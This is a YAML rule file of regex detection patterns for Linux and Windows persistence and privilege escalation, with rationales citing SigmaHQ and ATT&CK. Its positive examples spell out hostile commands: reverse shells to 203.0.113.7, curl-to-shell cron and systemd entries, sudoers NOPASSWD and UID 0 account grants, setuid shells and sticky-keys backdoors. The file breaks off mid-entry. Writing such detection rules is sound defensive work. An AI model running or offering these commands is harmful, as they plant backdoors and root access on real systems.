# Mention patterns for persistence and privilege shapes written in free text: SSH key planting, cron and systemd
# entries that run downloaders, preload hijacks, setuid shells, root-equivalent accounts and sudoers grants on Linux;
# accessibility backdoors, autoruns, scheduled tasks, services and local admin accounts on Windows. Sources are
# SigmaHQ rules and the procedure text of the cited ATT&CK techniques (vendored Enterprise 20.0).
#
# Persistence edits by configuration management look similar, so the strong entries require what such tools do not
# do: a downloader or socket inside the persisted command, a temp-directory payload, or a root-equivalent grant.

- id: mention.persist.authorized_keys_echo_append
  title: SSH public key appended to authorized_keys with echo
  match:
    anchored: 'echo {1,3}["'']?(?:ssh-(?:rsa|ed25519|dss)|ecdsa-sha2-nistp[0-9]{3}) [A-Za-z0-9+/]{40,1000}={0,3}[^\n]{0,120}>> {0,2}[^\n]{0,80}authorized_keys'
  case_sensitive: false
  strength: medium
  attack: [T1098.004]
  telemetry: [linux_text]
  source:
    name: MITRE ATT&CK Enterprise 20.0, T1098.004 SSH Authorized Keys
    url: https://attack.mitre.org/techniques/T1098/004
    license: MITRE ATT&CK Terms of Use (royalty-free, copyright notice retained)
    upstream_id: T1098.004
  rationale: >-
    Appending a key to authorized_keys from the command line is how worms (TeamTNT, Kinsing) and hands-on intruders
    keep SSH access. Administrators normally use ssh-copy-id or configuration management, but some paste keys by
    hand, so for an ordinary account it is medium; the root-account entry is strong.
  examples:
    positive:
      - 'Nov 20 13:00:00 web01 bash[800]: HISTORY: echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7vH3kq2mZ9xY1pQ8rT5uW4e attacker" >> /home/www/.ssh/authorized_keys'
    negative:
      - 'Nov 20 13:00:01 web01 sshd[801]: Authentication refused: bad ownership or modes for file /home/alice/.ssh/authorized_keys'
      - 'Nov 20 13:00:02 web01 bash[802]: HISTORY: ssh-copy-id -i ~/.ssh/id_ed25519.pub alice@web02'

- id: mention.persist.root_authorized_keys_append
  title: SSH public key appended to root's authorized_keys
  match:
    anchored: 'ssh-(?:rsa|ed25519|dss) [A-Za-z0-9+/]{40,1000}={0,3}[^\n]{0,120}>> {0,2}/root/\.ssh/authorized_keys'
  case_sensitive: false
  strength: strong
  attack: [T1098.004]
  telemetry: [linux_text]
  source:
    name: MITRE ATT&CK Enterprise 20.0, T1098.004 SSH Authorized Keys
    url: https://attack.mitre.org/techniques/T1098/004
    license: MITRE ATT&CK Terms of Use (royalty-free, copyright notice retained)
    upstream_id: T1098.004
  rationale: >-
    A key written straight into root's authorized_keys from a command line gives permanent root SSH access; cloud
    worms and exploit payloads do this. Fleet key management writes through its own tooling, not echo appends.
  examples:
    positive:
      - 'Nov 20 13:01:00 web01 sh[803]: echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDf3kq2mZ9xY1pQ8rT5uW4eZ0b root@x >> /root/.ssh/authorized_keys'
    negative:
      - 'Nov 20 13:01:01 web01 sshd[804]: Accepted publickey for root from 10.0.4.12 port 50122 ssh2: RSA SHA256:3q2+7w'
      - 'Nov 20 13:01:02 web01 bash[805]: HISTORY: cat /root/.ssh/authorized_keys'

- id: mention.persist.authorized_keys_immutable
  title: authorized_keys made immutable or append-only
  match:
    anchored: 'chattr {1,3}\+[aiu]{1,3} {1,3}[^\n]{0,80}authorized_keys'
  case_sensitive: false
  strength: strong
  attack: [T1098.004, T1222.002]
  telemetry: [linux_text]
  source:
    name: MITRE ATT&CK Enterprise 20.0, T1098.004 SSH Authorized Keys
    url: https://attack.mitre.org/techniques/T1098/004
    license: MITRE ATT&CK Terms of Use (royalty-free, copyright notice retained)
    upstream_id: T1098.004
  rationale: >-
    Locking authorized_keys with chattr after planting a key stops the owner and other malware from removing it, a
    documented cloud-worm habit. Administrators have no reason to freeze the file.
  examples:
    positive:
      - 'Nov 20 13:02:00 web01 sh[806]: chattr +ia /root/.ssh/authorized_keys'
    negative:
      - 'Nov 20 13:02:01 web01 bash[807]: HISTORY: chattr +i /etc/resolv.conf'
      - 'Nov 20 13:02:02 web01 bash[808]: HISTORY: chmod 600 ~/.ssh/authorized_keys'

- id: mention.persist.cron_every_minute_downloader
  title: Cron schedule running a downloader piped into a shell
  match:
    anchored: '\* \* \* \* [^\n]{0,60}(?:curl|wget)[^\n]{1,200}\| {0,3}(?:/usr)?(?:/bin/)?(?:ba|da|z|k|a)?sh\b'
  case_sensitive: false
  strength: strong
  attack: [T1053.003, T1105]
  telemetry: [linux_text]
  source:
    name: MITRE ATT&CK Enterprise 20.0, T1053.003 Cron
    url: https://attack.mitre.org/techniques/T1053/003
    license: MITRE ATT&CK Terms of Use (royalty-free, copyright notice retained)
    upstream_id: T1053.003
  rationale: >-
    A crontab line (every minute or every N minutes, both end in '* * * *') that fetches a script and pipes it into a
    shell re-infects the host on a timer; it is the persistence of miners and botnets. Scheduled maintenance runs
    local scripts, not remote content piped into a shell.
  examples:
    positive:
      - 'Nov 20 13:03:00 web01 CRON[809]: (www-data) CMD (*/5 * * * * curl -fsSL http://203.0.113.7/cr.sh | sh)'
      - '* * * * * root wget -q -O- http://198.51.100.2/u | bash'
    negative:
      - 'Nov 20 13:03:01 web01 CRON[810]: (root) CMD (   cd / && run-parts --report /etc/cron.hourly)'
      - '*/5 * * * * root /usr/local/bin/backup.sh > /dev/null 2>&1'

- id: mention.persist.cron_reboot_payload
  title: '@reboot cron entry running a downloader, socket or decoder'
  match:
    anchored: '@reboot[^\n]{1,200}(?:curl |wget |/dev/tcp/|nc -e|base64 -d)'
  case_sensitive: false
  strength: strong
  attack: [T1053.003, T1105]
  telemetry: [linux_text]
  source:
    name: MITRE ATT&CK Enterprise 20.0, T1053.003 Cron
    url: https://attack.mitre.org/techniques/T1053/003
    license: MITRE ATT&CK Terms of Use (royalty-free, copyright notice retained)
    upstream_id: T1053.003
  rationale: >-
    An @reboot job that downloads, opens a socket or decodes base64 restores an implant at every boot. Services start
    from systemd, not from a cron reboot line that reaches out to the network.
  examples:
    positive:
      - '@reboot /bin/bash -c "bash -i >& /dev/tcp/203.0.113.7/4444 0>&1"'
    negative:
      - '@reboot /usr/local/bin/start-dashboard.sh'
      - 'Nov 20 13:04:00 web01 cron[700]: (CRON) INFO (Running @reboot jobs)'

- id: mention.persist.crontab_from_echo_downloader
  title: Crontab installed from echo text that contains a downloader or socket
  match:
    anchored: 'echo [^\n]{1,300}(?:curl|wget|/dev/tcp/)[^\n]{0,200}\| {0,2}crontab {1,3}-'
  case_sensitive: false
  strength: strong
  attack: [T1053.003, T1105]
  telemetry: [linux_text]
  source:
    name: MITRE ATT&CK Enterprise 20.0, T1053.003 Cron
    url: https://attack.mitre.org/techniques/T1053/003
    license: MITRE ATT&CK Terms of Use (royalty-free, copyright notice retained)
    upstream_id: T1053.003
  rationale: >-
    Replacing a user's crontab with echoed text that fetches remote content installs scheduled re-infection in one
    command, the usual exploit-payload persistence. Admins edit with crontab -e or manage /etc/cron.d files.
  examples:
    positive:
      - 'Nov 20 13:05:00 web01 sh[811]: echo "*/10 * * * * wget -q -O - http://203.0.113.7/a | sh" | crontab -'
    negative:
      - 'Nov 20 13:05:01 web01 bash[812]: HISTORY: echo "0 2 * * * /usr/local/bin/backup.sh" | crontab -'
      - 'Nov 20 13:05:02 web01 bash[813]: HISTORY: crontab -l'

- id: mention.persist.crontab_append_pipeline
  title: Crontab rewritten by appending an echoed line
  match:
    anchored: 'crontab {1,3}-l[^\n]{0,20}; {0,2}echo [^\n]{1,300}\| {0,2}crontab {1,3}-'
  case_sensitive: false
  strength: medium
  attack: [T1053.003]
  telemetry: [linux_text]
  source:
    name: MITRE ATT&CK Enterprise 20.0, T1053.003 Cron
    url: https://attack.mitre.org/techniques/T1053/003
    license: MITRE ATT&CK Terms of Use (royalty-free, copyright notice retained)
    upstream_id: T1053.003
  rationale: >-
    '(crontab -l; echo "...") | crontab -' adds a job without an editor, which is how scripts and intruders persist.
    Install scripts use it too, so it is medium; the appended command decides.
  examples:
    positive:
      - 'Nov 20 13:06:00 web01 sh[814]: (crontab -l 2>/dev/null; echo "@hourly /tmp/.x/upd") | crontab -'
    negative:
      - 'Nov 20 13:06:01 web01 bash[815]: HISTORY: crontab -l > /tmp/cron.bak'
      - 'Nov 20 13:06:02 web01 bash[816]: HISTORY: crontab -e'

- id: mention.persist.cron_file_echo
  title: Text echoed into a system cron file or directory
  match:
    anchored: 'echo [^\n]{1,300}>{1,2} {0,2}/etc/cron(?:tab|\.d/|\.hourly/|\.daily/|\.weekly/|\.monthly/)'
  case_sensitive: false
  strength: medium
  attack: [T1053.003]
  telemetry: [linux_text]
  source:
    name: MITRE ATT&CK Enterprise 20.0, T1053.003 Cron
    url: https://attack.mitre.org/techniques/T1053/003
    license: MITRE ATT&CK Terms of Use (royalty-free, copyright notice retained)
    upstream_id: T1053.003
  rationale: >-
    Writing a system cron entry with echo from a shell is a direct persistence edit. Some provisioning scripts do the
    same, so it is medium.
  examples:
    positive:
      - 'Nov 20 13:07:00 web01 sh[817]: echo "* * * * * root /dev/shm/.k" > /etc/cron.d/0hourly2'
    negative:
      - 'Nov 20 13:07:01 web01 bash[818]: HISTORY: ls -l /etc/cron.d/'
      - 'Nov 20 13:07:02 web01 bash[819]: HISTORY: echo "cron jobs reviewed" >> /var/log/audit-notes.txt'

- id: mention.persist.ld_preload_temp_library
  title: LD_PRELOAD set to a library in a temp or current directory
  match:
    anchored: 'LD_PRELOAD= {0,2}["'']?(?:/tmp/|/dev/shm/|/var/tmp/|\./)'
  case_sensitive: true
  strength: strong
  attack: [T1574.006]
  telemetry: [linux_text]
  source:
    name: MITRE ATT&CK Enterprise 20.0, T1574.006 Dynamic Linker Hijacking
    url: https://attack.mitre.org/techniques/T1574/006
    license: MITRE ATT&CK Terms of Use (royalty-free, copyright notice retained)
    upstream_id: T1574.006
  rationale: >-
    Preloading a shared object from /tmp, /dev/shm or the current directory injects attacker code into the next
    program (and is a classic local privilege escalation with sudo env_keep). Legitimate preloads (jemalloc,
    tcmalloc, libfaketime) come from system library paths.
  examples:
    positive:
      - 'Nov 20 13:08:00 web01 bash[820]: HISTORY: sudo LD_PRELOAD=/tmp/x.so apache2'
    negative:
      - 'Nov 20 13:08:01 web01 systemd[1]: app.service: Environment LD_PRELOAD=/usr/lib/x86_64-linux-gnu/libjemalloc.so.2'
      - 'Nov 20 13:08:02 web01 bash[821]: HISTORY: echo $LD_LIBRARY_PATH'

- id: mention.persist.ld_so_preload_write
  title: Text written into /etc/ld.so.preload
  match:
    anchored: 'echo [^\n]{1,200}>{1,2} {0,2}/etc/ld\.so\.preload'
  case_sensitive: true
  strength: strong
  attack: [T1574.006, T1014]
  telemetry: [linux_text]
  source:
    name: MITRE ATT&CK Enterprise 20.0, T1574.006 Dynamic Linker Hijacking
    url: https://attack.mitre.org/techniques/T1574/006
    license: MITRE ATT&CK Terms of Use (royalty-free, copyright notice retained)
    upstream_id: T1574.006
  rationale: >-
    Writing a library path into the global preload file loads it into every dynamically linked program; userland
    rootkits and miner kits install this way. Packages that need preloading ship the file, they do not echo into it.
  examples:
    positive:
      - 'Nov 20 13:09:00 web01 sh[822]: echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload'
    negative:
      - 'Nov 20 13:09:01 web01 bash[823]: HISTORY: cat /etc/ld.so.preload'
      - 'Nov 20 13:09:02 web01 bash[824]: HISTORY: echo /opt/lib > /etc/ld.so.conf.d/opt.conf'

- id: mention.persist.setuid_in_temp
  title: setuid or setgid bit set on a file in a temp directory
  match:
    anchored: 'chmod {1,3}(?:u\+s|g\+s|\+s|[2467][0-7]{3}) {1,3}[^\n]{0,60}(?:/tmp/|/dev/shm/|/var/tmp/)'
  case_sensitive: true
  strength: strong
  attack: [T1548.001]
  telemetry: [linux_text]
  source:
    name: 'SigmaHQ: Setuid and Setgid (Omer Gunal)'
    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/process_creation/proc_creation_lnx_setgid_setuid.yml
    license: DRL-1.1
    upstream_id: c21c4eaa-ba2e-419a-92b2-8371703cbe21
  rationale: >-
    Narrows the rule (chown root plus chmod u+s or g+s) to the strongest case: a setuid or setgid file in a
    world-writable temp directory is a planted privilege-escalation backdoor. Packages install setuid binaries under
    /usr, never in /tmp.
  examples:
    positive:
      - 'Nov 20 13:10:00 web01 bash[825]: HISTORY: chmod 4755 /tmp/.bash'
      - 'Nov 20 13:10:01 web01 bash[826]: HISTORY: chmod u+s /dev/shm/rootme'
    negative:
      - 'Nov 20 13:10:02 web01 bash[827]: HISTORY: chmod 1777 /tmp'
      - 'Nov 20 13:10:03 web01 bash[828]: HISTORY: chmod 755 /tmp/build/run.sh'

- id: mention.persist.setuid_system_shell
  title: setuid bit set on a system shell
  match:
    anchored: 'chmod {1,3}(?:u\+s|\+s|[2467][0-7]{3}) {1,3}(?:/usr)?/bin/(?:ba|da|z|k|a)?sh\b'
  case_sensitive: true
  strength: strong
  attack: [T1548.001]
  telemetry: [linux_text]
  source:
    name: MITRE ATT&CK Enterprise 20.0, T1548.001 Setuid and Setgid
    url: https://attack.mitre.org/techniques/T1548/001
    license: MITRE ATT&CK Terms of Use (royalty-free, copyright notice retained)
    upstream_id: T1548.001
  rationale: >-
    A setuid shell ('bash -p' then gives a root shell to anyone) is the simplest root backdoor; no distribution ships
    a setuid shell.
  examples:
    positive:
      - 'Nov 20 13:11:00 web01 bash[829]: HISTORY: chmod u+s /bin/bash'
    negative:
      - 'Nov 20 13:11:01 web01 bash[830]: HISTORY: chmod 755 /bin/backup-wrapper'
      - 'Nov 20 13:11:02 web01 bash[831]: HISTORY: ls -l /bin/bash'

- id: mention.persist.shell_copied_to_temp
  title: System shell copied into a temp directory
  match:
    anchored: 'cp /(?:usr/)?bin/(?:ba|da|z|k|a)?sh {1,3}(?:/tmp/|/dev/shm/|/var/tmp/)'
  case_sensitive: true
  strength: medium
  attack: [T1548.001]
  telemetry: [linux_text]
  source:
    name: MITRE ATT&CK Enterprise 20.0, T1548.001 Setuid and Setgid
    url: https://attack.mitre.org/techniques/T1548/001
    license: MITRE ATT&CK Terms of Use (royalty-free, copyright notice retained)
    upstream_id: T1548.001
  rationale: >-
    Copying a shell into a temp directory is the first step of a setuid shell backdoor (copy, then chmod 4755). Test
    harnesses occasionally copy shells into sandboxes, so alone it is medium.
  examples:
    positive:
      - 'Nov 20 13:12:00 web01 sh[832]: cp /bin/bash /tmp/.sh; chmod +s /tmp/.sh'
    negative:
      - 'Nov 20 13:12:01 web01 bash[833]: HISTORY: cp /bin/ls /tmp/ls.bak'
      - 'Nov 20 13:12:02 web01 bash[834]: HISTORY: cp /etc/bash.bashrc /tmp/bashrc.orig'

- id: mention.persist.sudoers_nopasswd_append
  title: Passwordless sudo-to-everything appended to sudoers
  match:
    anchored: 'echo [^\n]{1,160}NOPASSWD: {0,2}ALL[^\n]{0,80}>> {0,2}/etc/sudoers'
  case_sensitive: true
  strength: strong
  attack: [T1548.003, T1098]
  telemetry: [linux_text]
  source:
    name: 'SigmaHQ: Persistence Via Sudoers Files (Nasreddine Bencherchali, Nextron Systems)'
    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/file_event/file_event_lnx_persistence_sudoers_files.yml
    license: DRL-1.1
    upstream_id: ddb26b76-4447-4807-871f-1b035b2bfa5d
  rationale: >-
    The rule flags writes to sudoers; this is the command-line form of the most dangerous write, an unrestricted
    passwordless grant appended with echo. Administrators edit sudoers with visudo or drop-in files from
    configuration management.
  examples:
    positive:
      - 'Nov 20 13:13:00 web01 sh[835]: echo "www-data ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers'
    negative:
      - 'Nov 20 13:13:01 web01 sudo[836]: alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/sbin/visudo'
      - 'Nov 20 13:13:02 web01 bash[837]: HISTORY: grep NOPASSWD /etc/sudoers.d/*'

- id: mention.persist.useradd_duplicate_uid0
  title: useradd creating a non-unique UID 0 account
  match:
    anchored: 'useradd [^\n]{0,100}(?:-o {1,3}-u {1,3}0|-u {1,3}0 {1,3}-o)\b'
  case_sensitive: true
  strength: strong
  attack: [T1136.001]
  telemetry: [linux_text]
  source:
    name: MITRE ATT&CK Enterprise 20.0, T1136.001 Local Account
    url: https://attack.mitre.org/techniques/T1136/001
    license: MITRE ATT&CK Terms of Use (royalty-free, copyright notice retained)
    upstream_id: T1136.001
  rationale: >-
    '-o -u 0' creates a second account with root's UID, a root backdoor under another name. There is no
    administrative reason for a duplicate UID 0.
  examples:
    positive:
      - 'Nov 20 13:14:00 web01 bash[838]: HISTORY: useradd -o -u 0 -g 0 -M -d /root -s /bin/bash sysupd'
    negative:
      - 'Nov 20 13:14:01 web01 bash[839]: HISTORY: useradd -m -u 1005 -s /bin/bash carol'
      - 'Nov 20 13:14:02 web01 bash[840]: HISTORY: useradd -r -u 999 svc_app'

- id: mention.persist.passwd_uid0_append
  title: UID 0 line appended to /etc/passwd
  match:
    anchored: 'echo [^\n]{1,120}:0:0:[^\n]{0,120}>> {0,2}/etc/passwd'
  case_sensitive: true
  strength: strong
  attack: [T1136.001, T1098]
  telemetry: [linux_text]
  source:
    name: MITRE ATT&CK Enterprise 20.0, T1136.001 Local Account
    url: https://attack.mitre.org/techniques/T1136/001
    license: MITRE ATT&CK Terms of Use (royalty-free, copyright notice retained)
    upstream_id: T1136.001
  rationale: >-
    Appending a passwd line with UID and GID 0 creates a root account without the user tools, the usual move after a
    file-write vulnerability. Account tools never echo into /etc/passwd.
  examples:
    positive:
      - 'Nov 20 13:15:00 web01 sh[841]: echo ''hacker:$1$xyz$abc:0:0:root:/root:/bin/bash'' >> /etc/passwd'
    negative:
      - 'Nov 20 13:15:01 web01 bash[842]: HISTORY: getent passwd alice'
      - 'Nov 20 13:15:02 web01 bash[843]: HISTORY: echo "alice:x:1001:1001::/home/alice:/bin/bash" > /tmp/passwd.test'

- id: mention.persist.systemd_execstart_temp
  title: systemd ExecStart pointing into a temp directory
  match:
    anchored: 'ExecStart= {0,2}[^\n]{0,40}(?:/tmp/|/dev/shm/|/var/tmp/)'
  case_sensitive: true
  strength: strong
  attack: [T1543.002]
  telemetry: [linux_text]
  source:
    name: MITRE ATT&CK Enterprise 20.0, T1543.002 Systemd Service
    url: https://attack.mitre.org/techniques/T1543/002
    license: MITRE ATT&CK Terms of Use (royalty-free, copyright notice retained)
    upstream_id: T1543.002
  rationale: >-
    A unit whose ExecStart runs from /tmp, /dev/shm or /var/tmp persists a dropped payload as a service. Packaged and
    in-house services run from /usr, /opt or application directories.
  examples:
    positive:
      - 'Nov 20 13:16:00 web01 sh[844]: printf "[Service]\nExecStart=/dev/shm/.kworker\nRestart=always\n" > /etc/systemd/system/kworker.service'
    negative:
      - 'Nov 20 13:16:01 web01 systemd[1]: nginx.service: ExecStart=/usr/sbin/nginx -g daemon on; master_process on;'
      - 'Nov 20 13:16:02 web01 systemd[1]: systemd-tmpfiles-clean.service: Cleaning up temporary directories /tmp'

- id: mention.persist.systemd_execstart_downloader
  title: systemd ExecStart running a downloader piped into a shell
  match:
    anchored: 'ExecStart=[^\n]{0,80}(?:curl|wget)[^\n]{0,200}\| {0,2}(?:/usr)?(?:/bin/)?(?:ba|da|z|k|a)?sh\b'
  case_sensitive: true
  strength: strong
  attack: [T1543.002, T1105]
  telemetry: [linux_text]
  source:
    name: MITRE ATT&CK Enterprise 20.0, T1543.002 Systemd Service
    url: https://attack.mitre.org/techniques/T1543/002
    license: MITRE ATT&CK Terms of Use (royalty-free, copyright notice retained)
    upstream_id: T1543.002
  rationale: >-
    A service that fetches a script and pipes it into a shell at every start re-infects on boot; real services run
    installed binaries.
  examples:
    positive:
      - 'ExecStart=/bin/bash -c "curl -s http://203.0.113.7/s.sh | bash"'
    negative:
      - 'ExecStart=/usr/bin/curl -fsS -o /var/lib/app/feed.json https://feeds.example.org/latest'
      - 'ExecStart=/opt/app/bin/server --port 8080'

- id: mention.persist.shell_rc_payload
  title: Shell startup file appended with a downloader or socket command
  match:
    anchored: 'echo [^\n]{0,200}(?:curl |wget |/dev/tcp/|nc -e)[^\n]{0,200}>> {0,2}[^\n]{0,40}\.(?:bashrc|bash_profile|profile|zshrc)\b'
  case_sensitive: true
  strength: strong
  attack: [T1546.004]
  telemetry: [linux_text]
  source:
    name: MITRE ATT&CK Enterprise 20.0, T1546.004 Unix Shell Configuration Modification
    url: https://attack.mitre.org/techniques/T1546/004
    license: MITRE ATT&CK Terms of Use (royalty-free, copyright notice retained)
    upstream_id: T1546.004
  rationale: >-
    Appending a network command to .bashrc or .profile runs it at every login. Users add PATH and alias lines to these
    files, not downloaders or sockets.
  examples:
    positive:
      - 'Nov 20 13:17:00 web01 sh[845]: echo "nohup bash -c ''bash -i >& /dev/tcp/203.0.113.7/443 0>&1'' &" >> /home/alice/.bashrc'
    negative:
      - 'Nov 20 13:17:01 web01 bash[846]: HISTORY: echo ''export PATH=$PATH:/opt/tools/bin'' >> ~/.bashrc'
      - 'Nov 20 13:17:02 web01 bash[847]: HISTORY: echo "alias ll=''ls -la''" >> ~/.zshrc'

- id: mention.persist.rc_local_payload
  title: rc.local appended with a downloader or socket command
  match:
    anchored: 'echo [^\n]{1,200}(?:curl|wget|/dev/tcp/)[^\n]{0,200}>> {0,2}/etc/rc\.local'
  case_sensitive: true
  strength: strong
  attack: [T1037.004, T1105]
  telemetry: [linux_text]
  source:
    name: MITRE ATT&CK Enterprise 20.0, T1037.004 RC Scripts
    url: https://attack.mitre.org/techniques/T1037/004
    license: MITRE ATT&CK Terms of Use (royalty-free, copyright notice retained)
    upstream_id: T1037.004
  rationale: >-
    rc.local runs as root at boot; appending a network fetch or socket to it is boot persistence used by botnets.
    Modern systems rarely use rc.local, and never for downloaders.
  examples:
    positive:
      - 'Nov 20 13:18:00 web01 sh[848]: echo "wget -q http://203.0.113.7/b -O /tmp/b && sh /tmp/b &" >> /etc/rc.local'
    negative:
      - 'Nov 20 13:18:01 web01 bash[849]: HISTORY: echo "/usr/local/bin/fan-control &" >> /etc/rc.local'
      - 'Nov 20 13:18:02 web01 bash[850]: HISTORY: cat /etc/rc.local'

- id: mention.persist.insmod_from_temp
  title: Kernel module loaded from a temp directory
  match:
    anchored: 'insmod {1,3}(?:/tmp/|/dev/shm/|/var/tmp/)[^\n]{1,80}\.ko\b'
  case_sensitive: true
  strength: strong
  attack: [T1547.006, T1014]
  telemetry: [linux_text]
  source:
    name: MITRE ATT&CK Enterprise 20.0, T1547.006 Kernel Modules and Extensions
    url: https://attack.mitre.org/techniques/T1547/006
    license: MITRE ATT&CK Terms of Use (royalty-free, copyright notice retained)
    upstream_id: T1547.006
  rationale: >-
    Loading a kernel module straight out of /tmp or /dev/shm is how LKM rootkits (Diamorphine, Reptile) are installed
    by hand; DKMS and vendor drivers load from /lib/modules.
  examples:
    positive:
      - 'Nov 20 13:19:00 web01 bash[851]: HISTORY: insmod /tmp/.d/diamorphine.ko'
    negative:
      - 'Nov 20 13:19:01 web01 bash[852]: HISTORY: modprobe nvidia'
      - 'Nov 20 13:19:02 web01 bash[853]: HISTORY: insmod /lib/modules/6.8.0-45-generic/extra/vboxdrv.ko'

- id: mention.persist.sticky_keys_cmd_copy
  title: cmd.exe copied over an accessibility binary
  match:
    anchored: 'copy {1,3}/y {1,3}C:\\windows\\system32\\cmd\.exe {1,3}C:\\windows\\system32\\(?:sethc|utilman|osk|magnify|narrator|displayswitch|atbroker)\.exe'
  case_sensitive: false
  strength: strong
  attack: [T1546.008]
  telemetry: [windows_text]
  source:
    name: 'SigmaHQ: Persistence Via Sticky Key Backdoor (Sreeman)'
    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_cmd_sticky_keys_replace.yml
    license: DRL-1.1
    upstream_id: 1070db9a-3e5d-412e-8e7b-7183b616e1b3
  rationale: >-
    Extends the rule's sethc.exe replacement to the other accessibility binaries ATT&CK T1546.008 lists: a cmd.exe
    copied over one of them gives a SYSTEM shell at the logon screen. The rule rates false positives as unlikely.
  examples:
    positive:
      - 'cmd.exe /c copy /y C:\windows\system32\cmd.exe C:\windows\system32\sethc.exe'
    negative:
      - 'copy /y C:\Temp\report.xlsx \\fileserver\reports\'
      - 'sfc /scannow'

- id: mention.persist.ifeo_accessibility
  title: Image File Execution Options key on an accessibility binary
  match:
    anchored: 'Image File Execution Options\\(?:sethc|utilman|osk|magnify|narrator|displayswitch|atbroker)\.exe'
  case_sensitive: false
  strength: strong
  attack: [T1546.008, T1546.012]
  telemetry: [windows_text]
  source:
    name: MITRE ATT&CK Enterprise 20.0, T1546.008 Accessibility Features
    url: https://attack.mitre.org/techniques/T1546/008
    license: MITRE ATT&CK Terms of Use (royalty-free, copyright notice retained)
    upstream_id: T1546.008
  rationale: >-
    A debugger registered for sethc.exe or utilman.exe under IFEO runs the attacker's program from the logon screen
    as SYSTEM. No product configures IFEO for accessibility binaries.
  examples:
    positive:
      - 'reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d C:\windows\system32\cmd.exe'
    negative:
      - 'reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\chrome.exe"'
      - 'reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoRestartShell /t REG_DWORD /d 1'

- id: mention.persist.run_key_suspicious_target
  title: Run or RunOnce key pointing at a script host, LOLBin or temp path
  match:
    anchored: 'CurrentVersion\\Run(?:Once)?\b[^\n]{1,300}(?:powershell|mshta|rundll32 [^\n]{0,40}javascript|regsvr32|wscript|cscript|\\AppData\\Local\\Temp\\|\\Users\\Public\\|%TEMP%)'
  case_sensitive: false
  strength: medium
  attack: [T1547.001]
  telemetry: [windows_text]
  source:
    name: MITRE ATT&CK Enterprise 20.0, T1547.001 Registry Run Keys / Startup Folder
    url: https://attack.mitre.org/techniques/T1547/001
    license: MITRE ATT&CK Terms of Use (royalty-free, copyright notice retained)
    upstream_id: T1547.001
  rationale: >-
    An autorun that starts PowerShell, mshta, a script host or a binary from Temp or Public is the commodity malware
    persistence. Some software starts helper scripts at logon, so it is medium; per-user app updaters under AppData
    without Temp are not matched.
  examples:
    positive:
      - 'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /d "powershell -w hidden -enc SQBFAFgA" /f'
    negative:
      - 'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v OneDrive /d "C:\Users\alice\AppData\Local\Microsoft\OneDrive\OneDrive.exe /background"'
      - 'reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run'

- id: mention.persist.schtasks_suspicious_action
  title: Scheduled task created with an encoded, hidden or download command
  match:
    anchored: 'schtasks(?:\.exe)?["'']? [^\n]{0,40}/create [^\n]{1,400}(?: -enc | -w hidden | bypass |\.DownloadString|\.DownloadFile|\.DownloadData|FromBase64String|mshta(?:\.exe)? http| IEX|/c start /min | -decode )'
  case_sensitive: false
  strength: strong
  attack: [T1053.005]
  telemetry: [windows_text]
  source:
    name: 'SigmaHQ: Suspicious Command Patterns In Scheduled Task Creation (Florian Roth, Nextron Systems)'
    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_schtasks_susp_pattern.yml
    license: DRL-1.1
    upstream_id: f2c64357-b1d2-41b7-849f-34d2682c0fad
  rationale: >-
    The rule's uncommon-pattern selection: a task whose action is encoded PowerShell, a hidden window, an execution
    policy bypass, a web download or a remote HTA is persistence for a loader. Enterprise tasks run signed binaries
    and scripts by path.
  examples:
    positive:
      - 'schtasks /create /sc minute /mo 30 /tn "GoogleUpdateTaskMachine" /tr "powershell -w hidden -c IEX (New-Object Net.WebClient).DownloadString(''http://203.0.113.7/u'')" /ru system'
    negative:
      - 'schtasks /create /tn "Corp\Inventory" /tr "C:\Program Files\Corp\inventory.exe" /sc daily /st 02:00'
      - 'schtasks /query /fo LIST /v'

- id: mention.persist.service_binpath_shell
  title: Service binary path that runs cmd, PowerShell or a user-writable path
  match:
    anchored: 'binpath= {0,2}["'']?[^\n]{0,40}(?:cmd(?:\.exe)? {1,3}/c|powershell|%COMSPEC%|\\Users\\Public\\|\\AppData\\|\\Windows\\Temp\\)'
  case_sensitive: false
  strength: medium
  attack: [T1543.003, T1569.002]
  telemetry: [windows_text]
  source:
    name: MITRE ATT&CK Enterprise 20.0, T1543.003 Windows Service
    url: https://attack.mitre.org/techniques/T1543/003
    license: MITRE ATT&CK Terms of Use (royalty-free, copyright notice retained)
    upstream_id: T1543.003
  rationale: >-
    'sc create X binpath= "cmd /c ..."' is how PsExec-style lateral movement and loaders run commands as services.
    Installers register real service binaries under Program Files, but a few wrap scripts, so it is medium.
  examples:
    positive:
      - 'sc \\10.0.0.12 create upd binpath= "cmd.exe /c powershell -enc SQBFAFgA" start= auto'
    negative:
      - 'sc create CorpAgent binpath= "C:\Program Files\Corp\agent.exe" start= auto'
      - 'sc query state= all'

- id: mention.persist.wmi_script_consumer
  title: WMI ActiveScriptEventConsumer
  match:
    literal: ['ActiveScriptEventConsumer']
  case_sensitive: false
  strength: medium
  attack: [T1546.003]
  telemetry: [windows_text]
  source:
    name: MITRE ATT&CK Enterprise 20.0, T1546.003 Windows Management Instrumentation Event Subscription
    url: https://attack.mitre.org/techniques/T1546/003
    license: MITRE ATT&CK Terms of Use (royalty-free, copyright notice retained)
    upstream_id: T1546.003
  rationale: >-
    A WMI consumer that runs VBScript or JScript when an event fires is fileless persistence used by several APT and
    miner families. Very few products register script consumers, so it is medium.
  examples:
    positive:
